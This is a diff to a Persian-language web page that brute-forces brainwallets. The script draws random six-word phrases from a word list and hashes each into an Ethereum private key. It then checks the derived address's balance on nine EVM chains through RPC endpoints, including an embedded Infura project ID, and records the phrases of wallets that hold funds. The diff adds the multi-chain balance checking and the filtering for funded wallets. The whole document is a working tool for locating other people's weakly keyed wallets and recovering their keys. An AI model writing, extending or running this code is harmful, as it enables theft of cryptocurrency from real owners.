@@ -21,7 +21,7 @@ body {
 }
 
 .container {
-    max-width: 850px;
+    max-width: 900px;
     margin: auto;
     background: #1a1a1a;
     padding: 25px;
@@ -65,6 +65,11 @@ textarea.found {
 textarea.checking {
     border: 2px solid #f59e0b;
     box-shadow: 0 0 20px rgba(245, 158, 11, 0.2);
+}
+
+textarea.balance-check {
+    border: 2px solid #60a5fa;
+    box-shadow: 0 0 20px rgba(96, 165, 250, 0.2);
 }
 
 .btn-group {
@@ -148,13 +153,31 @@ textarea.checking {
     font-size: 15px;
 }
 
-.private-key {
+.balance-info {
+    margin-top: 10px;
+    padding: 10px;
+    background: #0a2647;
+    border-radius: 8px;
     direction: ltr;
     text-align: left;
-    word-break: break-all;
-    color: #ffa500;
-    font-family: monospace;
-    font-size: 15px;
+}
+
+.balance-info .chain {
+    color: #60a5fa;
+    font-weight: bold;
+}
+
+.balance-info .amount {
+    color: #4CAF50;
+    font-weight: bold;
+}
+
+.balance-info .amount.zero {
+    color: #9ca3af;
+}
+
+.balance-info .error-text {
+    color: #f87171;
 }
 
 .error {
@@ -378,9 +401,26 @@ textarea.checking {
     vertical-align: middle;
 }
 
-.spinner-white {
-    border: 3px solid #fff;
-    border-top: 3px solid transparent;
+.balance-details {
+    margin-top: 8px;
+    font-size: 13px;
+    line-height: 1.8;
+}
+
+.balance-details .chain-name {
+    color: #60a5fa;
+}
+
+.balance-details .balance-amount {
+    color: #4CAF50;
+}
+
+.balance-details .balance-zero {
+    color: #9ca3af;
+}
+
+.balance-details .balance-error {
+    color: #f87171;
 }
 </style>
 </head>
@@ -391,7 +431,7 @@ textarea.checking {
 
     <h1>
         🔑 جستجوی خودکار کیف پول
-        <span>⏳ عبارات ۶ کلمه‌ای - ذخیره جداگانه آدرس‌ها و عبارات</span>
+        <span>⏳ عبارات ۶ کلمه‌ای - بررسی موجودی تمام شبکه‌ها</span>
     </h1>
 
     <div id="status" class="status loading">⏳ در حال بارگذاری کلمات از فایل key.txt...</div>
@@ -423,8 +463,10 @@ textarea.checking {
     <div id="result" class="result">
         <div class="label">🔗 آدرس کیف پول:</div>
         <div id="address" class="address"></div>
-        <div class="label" style="margin-top:10px;">🔑 کلید خصوصی:</div>
-        <div id="privateKey" class="private-key"></div>
+        <div id="balanceContainer" class="balance-info" style="display:none;">
+            <div class="label">💰 موجودی:</div>
+            <div id="balanceDetails" class="balance-details"></div>
+        </div>
     </div>
 
     <!-- لیست‌های جداگانه -->
@@ -460,13 +502,72 @@ textarea.checking {
     </div>
 
     <div class="info">
-        ⏳ هر کیف پول پیدا شده در دو لیست جداگانه ذخیره می‌شود | 🔒 آدرس‌ها و عبارات جدا
+        ⏳ هر کیف پول پیدا شده در دو لیست جداگانه ذخیره می‌شود | 🔒 موجودی تمام شبکه‌های مهم
     </div>
 
 </div>
 
 <script>
 
+// ==================== تنظیمات شبکه‌ها ====================
+const NETWORKS = [
+    {
+        name: 'Ethereum',
+        chainId: 1,
+        symbol: 'ETH',
+        rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    },
+    {
+        name: 'Polygon',
+        chainId: 137,
+        symbol: 'POL',
+        rpc: 'https://polygon-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    },
+    {
+        name: 'BNB Smart Chain',
+        chainId: 56,
+        symbol: 'BNB',
+        rpc: 'https://bsc-dataseed.binance.org'
+    },
+    {
+        name: 'Avalanche C-Chain',
+        chainId: 43114,
+        symbol: 'AVAX',
+        rpc: 'https://avalanche-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    },
+    {
+        name: 'Arbitrum',
+        chainId: 42161,
+        symbol: 'ETH',
+        rpc: 'https://arbitrum-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    },
+    {
+        name: 'Optimism',
+        chainId: 10,
+        symbol: 'ETH',
+        rpc: 'https://optimism-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    },
+    {
+        name: 'Fantom',
+        chainId: 250,
+        symbol: 'FTM',
+        rpc: 'https://rpc.ftm.tools'
+    },
+    {
+        name: 'Cronos',
+        chainId: 25,
+        symbol: 'CRO',
+        rpc: 'https://evm.cronos.org'
+    },
+    {
+        name: 'Gnosis',
+        chainId: 100,
+        symbol: 'xDAI',
+        rpc: 'https://rpc.gnosischain.com'
+    }
+];
+
+// ==================== متغیرهای اصلی ====================
 let fileWords = [];
 let isAutoFinding = false;
 let autoInterval = null;
@@ -474,15 +575,16 @@ let attempts = 0;
 let foundCount = 0;
 let startTime = 0;
 let speedCounter = 0;
+let isProcessing = false;
 
 // آرایه‌های جداگانه
 let foundAddresses = [];
 let foundMnemonics = [];
-let foundPrivateKeys = [];
 
-// کش برای بهبود سرعت
+// کش
 let walletCache = new Map();
 
+// ==================== المان‌های DOM ====================
 const statusDiv = document.getElementById('status');
 const randomBtn = document.getElementById('randomBtn');
 const copyBtn = document.getElementById('copyBtn');
@@ -490,13 +592,14 @@ const autoBtn = document.getElementById('autoBtn');
 const mnemonicInput = document.getElementById('mnemonic');
 const resultDiv = document.getElementById('result');
 const addressBox = document.getElementById('address');
-const privateKeyBox = document.getElementById('privateKey');
 const errorBox = document.getElementById('error');
 const counterDiv = document.getElementById('counter');
 const statsDiv = document.getElementById('stats');
 const statAttempts = document.getElementById('statAttempts');
 const statFound = document.getElementById('statFound');
 const statSpeed = document.getElementById('statSpeed');
+const balanceContainer = document.getElementById('balanceContainer');
+const balanceDetails = document.getElementById('balanceDetails');
 
 const addressListBox = document.getElementById('addressListBox');
 const mnemonicListBox = document.getElementById('mnemonicListBox');
@@ -569,10 +672,11 @@ function setRandomMnemonic() {
     const words = getRandomWords();
     if (!words) return;
     mnemonicInput.value = words.join(' ');
-    mnemonicInput.classList.remove('found', 'checking');
+    mnemonicInput.classList.remove('found', 'checking', 'balance-check');
     copyBtn.disabled = false;
     errorBox.textContent = '';
     resultDiv.style.display = 'none';
+    balanceContainer.style.display = 'none';
     
     statusDiv.className = 'status success';
     statusDiv.textContent = '✅ ۶ کلمه تصادفی انتخاب شد!';
@@ -589,10 +693,9 @@ function tryGenerateAddress(mnemonic) {
             return { success: false, error: "کتابخانه ethers بارگذاری نشده است." };
         }
         
-        // بررسی کش
         if (walletCache.has(mnemonic)) {
             const cached = walletCache.get(mnemonic);
-            return { success: true, address: cached.address, privateKey: cached.privateKey };
+            return { success: true, address: cached.address };
         }
         
         const words = mnemonic.split(" ");
@@ -600,27 +703,110 @@ function tryGenerateAddress(mnemonic) {
             return { success: false, error: "عبارت باید دقیقاً ۶ کلمه داشته باشد." };
         }
         
-        // تولید کلید خصوصی از عبارت ۶ کلمه‌ای (مشابه کد دوم)
         const privateKey = ethers.keccak256(ethers.toUtf8Bytes(mnemonic));
         const wallet = new ethers.Wallet(privateKey);
         const address = wallet.address;
         
-        // ذخیره در کش
-        walletCache.set(mnemonic, { address, privateKey });
+        walletCache.set(mnemonic, { address });
         
-        return { success: true, address: address, privateKey: privateKey };
+        return { success: true, address: address };
     } catch (error) {
         console.error(error);
         return { success: false, error: "خطا در پردازش عبارت بازیابی." };
     }
 }
 
-function generateAddress() {
+// ==================== بررسی موجودی تمام شبکه‌ها ====================
+async function checkAllBalances(address) {
+    const results = [];
+    
+    for (const network of NETWORKS) {
+        let retryCount = 0;
+        const maxRetries = 3;
+        let success = false;
+        
+        while (retryCount < maxRetries && !success) {
+            try {
+                const provider = new ethers.JsonRpcProvider(network.rpc);
+                const balance = await provider.getBalance(address);
+                const balanceEth = ethers.formatEther(balance);
+                
+                results.push({
+                    network: network.name,
+                    symbol: network.symbol,
+                    balance: balanceEth,
+                    success: true
+                });
+                success = true;
+                
+            } catch (error) {
+                retryCount++;
+                console.log(`Retry ${retryCount} for ${network.name}: ${error.message}`);
+                
+                if (retryCount === maxRetries) {
+                    results.push({
+                        network: network.name,
+                        symbol: network.symbol,
+                        balance: '0',
+                        success: false,
+                        error: error.message
+                    });
+                } else {
+                    // تأخیر قبل از تلاش مجدد
+                    await sleep(500);
+                }
+            }
+        }
+    }
+    
+    return results;
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// ==================== نمایش موجودی ====================
+function displayBalances(balances) {
+    balanceContainer.style.display = 'block';
+    let html = '';
+    let hasBalance = false;
+    
+    for (const b of balances) {
+        const amount = parseFloat(b.balance);
+        const className = amount > 0 ? 'balance-amount' : 'balance-zero';
+        
+        if (amount > 0) hasBalance = true;
+        
+        html += `<div>
+            <span class="chain-name">${b.network}:</span>
+            ${b.success ? 
+                `<span class="${className}">${Number(b.balance).toFixed(6)} ${b.symbol}</span>` :
+                `<span class="balance-error">❌ خطا در دریافت</span>`
+            }
+        </div>`;
+    }
+    
+    balanceDetails.innerHTML = html;
+    
+    // اگر موجودی داشت، هایلایت کن
+    if (hasBalance) {
+        balanceContainer.style.border = '2px solid #4CAF50';
+        balanceContainer.style.boxShadow = '0 0 30px rgba(76, 175, 80, 0.3)';
+    } else {
+        balanceContainer.style.border = '1px solid #333';
+        balanceContainer.style.boxShadow = 'none';
+    }
+}
+
+// ==================== تولید آدرس و بررسی موجودی ====================
+async function generateAddress() {
     const input = mnemonicInput;
     const result = resultDiv;
     const errorBox = document.getElementById("error");
 
     result.style.display = "none";
+    balanceContainer.style.display = 'none';
     errorBox.textContent = "";
 
     const mnemonic = input.value.trim().replace(/\s+/g, " ");
@@ -644,9 +830,21 @@ function generateAddress() {
     const resultObj = tryGenerateAddress(mnemonic);
     if (resultObj.success) {
         addressBox.textContent = resultObj.address;
-        privateKeyBox.textContent = resultObj.privateKey;
         result.style.display = "block";
         copyBtn.disabled = false;
+        
+        // بررسی موجودی
+        input.classList.add('balance-check');
+        statusDiv.className = 'status checking';
+        statusDiv.textContent = '⏳ در حال بررسی موجودی...';
+        statusDiv.style.display = 'block';
+        
+        const balances = await checkAllBalances(resultObj.address);
+        displayBalances(balances);
+        
+        statusDiv.style.display = 'none';
+        input.classList.remove('balance-check');
+        
     } else {
         errorBox.textContent = "❌ " + resultObj.error;
     }
@@ -654,14 +852,12 @@ function generateAddress() {
 
 // ==================== به‌روزرسانی لیست‌ها ====================
 function updateLists() {
-    // لیست آدرس‌ها
     if (foundAddresses.length > 0) {
         addressListBox.style.display = 'block';
         addressList.textContent = foundAddresses.join('\n');
         addressCount.textContent = `(${foundAddresses.length})`;
     }
 
-    // لیست عبارات
     if (foundMnemonics.length > 0) {
         mnemonicListBox.style.display = 'block';
         mnemonicList.textContent = foundMnemonics.join('\n\n');
@@ -703,79 +899,105 @@ function copyMnemonicList() {
 }
 
 // ==================== جستجوی خودکار ====================
-function findAddressAuto() {
-    if (isAutoFinding === false) return;
+async function findAddressAuto() {
+    if (isAutoFinding === false || isProcessing) return;
 
-    attempts++;
-    speedCounter++;
-    
-    const words = getRandomWords();
-    if (!words) {
-        stopAutoFind();
-        return;
-    }
+    isProcessing = true;
 
-    const mnemonic = words.join(' ');
-    
-    mnemonicInput.value = mnemonic;
-    mnemonicInput.classList.add('checking');
-    mnemonicInput.classList.remove('found');
-
-    const result = tryGenerateAddress(mnemonic);
-    
-    if (result.success) {
-        const address = result.address;
-        const privateKey = result.privateKey;
+    try {
+        attempts++;
+        speedCounter++;
         
-        // پیدا شد - ذخیره در آرایه‌های جداگانه
-        foundCount++;
-        foundAddresses.push(address);
-        foundMnemonics.push(mnemonic);
-        foundPrivateKeys.push(privateKey);
-
-        // به‌روزرسانی UI
-        addressBox.textContent = address;
-        privateKeyBox.textContent = privateKey;
-        resultDiv.style.display = "block";
-        errorBox.textContent = "";
-        copyBtn.disabled = false;
-
-        mnemonicInput.classList.remove('checking');
-        mnemonicInput.classList.add('found');
-
-        statusDiv.className = 'status found';
-        statusDiv.textContent = `✅ کیف پول پیدا شد! (${foundCount} تا)`;
-        statusDiv.style.display = 'block';
-        
-        counterDiv.className = 'counter found';
-        counterDiv.textContent = `✅ ${foundCount} کیف پول پیدا شد!`;
-        
-        // به‌روزرسانی لیست‌ها
-        updateLists();
-        
-        setTimeout(() => {
-            statusDiv.style.display = 'none';
-        }, 2000);
-        
-    } else {
-        if (attempts % 100 === 0) {
-            errorBox.textContent = `🔄 ${attempts} تلاش...`;
+        const words = getRandomWords();
+        if (!words) {
+            stopAutoFind();
+            return;
         }
-    }
-    
-    // به‌روزرسانی آمار
-    if (attempts % 50 === 0) {
-        statAttempts.textContent = attempts;
-        statsDiv.style.display = 'flex';
+
+        const mnemonic = words.join(' ');
         
-        if (startTime > 0) {
-            const elapsed = (Date.now() - startTime) / 1000;
-            if (elapsed > 0) {
-                const speed = Math.round(speedCounter / 50);
-                statSpeed.textContent = speed;
-                speedCounter = 0;
+        mnemonicInput.value = mnemonic;
+        mnemonicInput.classList.add('checking');
+        mnemonicInput.classList.remove('found');
+
+        const result = tryGenerateAddress(mnemonic);
+        
+        if (result.success) {
+            const address = result.address;
+            
+            // بررسی موجودی
+            const balances = await checkAllBalances(address);
+            
+            // بررسی آیا موجودی دارد
+            let hasBalance = false;
+            for (const b of balances) {
+                if (parseFloat(b.balance) > 0) {
+                    hasBalance = true;
+                    break;
+                }
+            }
+            
+            if (hasBalance) {
+                // پیدا شد با موجودی
+                foundCount++;
+                foundAddresses.push(address);
+                foundMnemonics.push(mnemonic);
+
+                addressBox.textContent = address;
+                resultDiv.style.display = "block";
+                displayBalances(balances);
+                errorBox.textContent = "";
+                copyBtn.disabled = false;
+
+                mnemonicInput.classList.remove('checking');
+                mnemonicInput.classList.add('found');
+
+                statusDiv.className = 'status found';
+                statusDiv.textContent = `✅ کیف پول با موجودی پیدا شد! (${foundCount} تا)`;
+                statusDiv.style.display = 'block';
+                
+                counterDiv.className = 'counter found';
+                counterDiv.textContent = `✅ ${foundCount} کیف پول با موجودی پیدا شد!`;
+                
+                updateLists();
+                statFound.textContent = foundCount;
+                
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 3000);
+            } else {
+                // بدون موجودی
+                if (attempts % 20 === 0) {
+                    errorBox.textContent = `🔄 ${attempts} تلاش... (بدون موجودی)`;
+                }
+                mnemonicInput.classList.remove('checking');
+            }
+        } else {
+            if (attempts % 100 === 0) {
+                errorBox.textContent = `🔄 ${attempts} تلاش...`;
+            }
+            mnemonicInput.classList.remove('checking');
+        }
+        
+        // به‌روزرسانی آمار
+        if (attempts % 10 === 0) {
+            statAttempts.textContent = attempts;
+            statsDiv.style.display = 'flex';
+            
+            if (startTime > 0) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                if (elapsed > 0) {
+                    const speed = Math.round(speedCounter / 10);
+                    statSpeed.textContent = speed;
+                    speedCounter = 0;
+                }
             }
         }
+        
+    } catch (error) {
+        console.error('Error in findAddressAuto:', error);
+    } finally {
+        isProcessing = false;
     }
 }
 
@@ -798,6 +1020,7 @@ function startAutoFind() {
     foundCount = 0;
     speedCounter = 0;
     startTime = Date.now();
+    isProcessing = false;
     
     statsDiv.style.display = 'flex';
     statAttempts.textContent = '0';
@@ -812,17 +1035,21 @@ function startAutoFind() {
     counterDiv.textContent = '⚡ شروع جستجو...';
     errorBox.textContent = '';
     resultDiv.style.display = 'none';
+    balanceContainer.style.display = 'none';
     
     statusDiv.className = 'status info';
     statusDiv.textContent = '⚡ جستجو در حال اجرا...';
     statusDiv.style.display = 'block';
 
+    // با سرعت کمتر برای بررسی موجودی
     findAddressAuto();
-    autoInterval = setInterval(findAddressAuto, 0);
+    autoInterval = setInterval(findAddressAuto, 300); // 300ms برای بررسی موجودی
 }
 
 function stopAutoFind() {
     isAutoFinding = false;
+    isProcessing = false;
+    
     if (autoInterval) {
         clearInterval(autoInterval);
         autoInterval = null;
@@ -844,9 +1071,9 @@ function stopAutoFind() {
         }, 3000);
     } else {
         statusDiv.className = 'status success';
-        statusDiv.textContent = `✅ ${foundCount} کیف پول پیدا شد!`;
+        statusDiv.textContent = `✅ ${foundCount} کیف پول با موجودی پیدا شد!`;
         statusDiv.style.display = 'block';
-        counterDiv.textContent = `✅ ${foundCount} کیف پول پیدا شد!`;
+        counterDiv.textContent = `✅ ${foundCount} کیف پول با موجودی پیدا شد!`;
         statFound.textContent = foundCount;
     }
 }
@@ -876,8 +1103,8 @@ function copyMnemonic() {
 // ==================== بارگذاری اولیه ====================
 window.addEventListener('DOMContentLoaded', loadWords);
 
-console.log('✅ کد آماده است! جستجوی عبارات ۶ کلمه‌ای');
+console.log('✅ کد آماده است! جستجوی عبارات ۶ کلمه‌ای با بررسی موجودی');
 </script>
 
 </body>
-  </html>
+    </html>
